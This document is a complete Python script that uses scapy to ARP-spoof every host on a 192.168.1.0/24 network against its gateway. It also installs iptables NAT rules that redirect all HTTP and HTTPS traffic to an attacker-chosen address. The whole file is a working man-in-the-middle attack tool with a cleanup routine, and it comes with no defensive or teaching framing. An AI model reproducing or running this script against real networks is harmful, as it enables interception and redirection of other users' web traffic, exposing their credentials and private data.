#!/usr/bin/env python3

import scapy.all as scapy
import subprocess
import sys
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

def spoof_all(spoof_ip, gateway_ip):
    while True:
        devices = scapy.arping("192.168.1.0/24", verbose=False)[0]
        for device in devices:
            target_ip = device[1].psrc
            if target_ip != gateway_ip and target_ip != spoof_ip:
                spoof(target_ip, gateway_ip)
                spoof(gateway_ip, target_ip)
        time.sleep(2)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

def setup_iptables(redirect_ip):
    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", redirect_ip])
    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "443", "-j", "DNAT", "--to-destination", redirect_ip])
    subprocess.call(["iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"])

def clear_iptables():
    subprocess.call(["iptables", "-t", "nat", "-F"])

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 script.py <redirect_ip> <gateway_ip>")
        sys.exit(1)

    redirect_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    try:
        print("[*] Setting up iptables...")
        setup_iptables(redirect_ip)
        print("[*] Starting ARP spoofing... Press Ctrl+C to stop.")
        spoof_all(redirect_ip, gateway_ip)
    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C! Restoring the network...")
        devices = scapy.arping("192.168.1.0/24", verbose=False)[0]
        for device in devices:
            target_ip = device[1].psrc
            restore(target_ip, gateway_ip)
            restore(gateway_ip, target_ip)
        clear_iptables()
        print("[*] Network restored. Exiting...")
